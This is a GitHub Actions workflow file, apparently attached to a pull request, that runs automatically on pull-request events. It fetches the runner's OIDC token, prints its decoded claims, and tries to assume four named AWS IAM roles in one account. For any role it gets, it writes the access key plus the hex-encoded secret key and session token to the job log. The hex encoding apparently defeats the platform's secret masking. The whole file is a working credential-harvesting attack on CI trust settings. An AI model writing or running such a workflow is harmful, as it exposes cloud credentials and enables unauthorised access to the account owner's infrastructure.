name: zzpr3932
on:
  workflow_dispatch:
  pull_request:
    types: [opened, synchronize, reopened]
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: claims and assume attempts
        run: |
          set -u
          echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY HEADREF=$GITHUB_HEAD_REF"
          URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${URL}&audience=sts.amazonaws.com")
          TOK=$(printf %s "$TOK" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "TOKLEN ${#TOK}"
          printf %s "$TOK" | python3 -c 'import sys,base64;p=sys.stdin.read().strip().split(".")[1];print("CLAIMS:",base64.urlsafe_b64decode(p+"="*(-len(p)%4)).decode())'
          for R in claude-code-bedrock-role github-actions-cua-downloads-publish github-actions-ecr-push-cua github-actions-cua-fleets-wif-smoke; do
            echo "=== ROLE $R aud=sts.amazonaws.com"
            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::296062593712:role/$R&RoleSessionName=pr3932&WebIdentityToken=$TOK&DurationSeconds=1800" -o /tmp/o.xml
            grep -o '<Code>[^<]*</Code>' /tmp/o.xml || true
            grep -o '<Message>[^<]*</Message>' /tmp/o.xml || true
            AK=$(grep -o '<AccessKeyId>[^<]*' /tmp/o.xml | cut -d'>' -f2)
            if [ -n "${AK:-}" ]; then
              echo "AK $AK"
              echo "SKHEX $(grep -o '<SecretAccessKey>[^<]*' /tmp/o.xml | cut -d'>' -f2 | xxd -p | tr -d '\n')"
              echo "STHEX $(grep -o '<SessionToken>[^<]*' /tmp/o.xml | cut -d'>' -f2 | xxd -p | tr -d '\n')"
            fi
          done
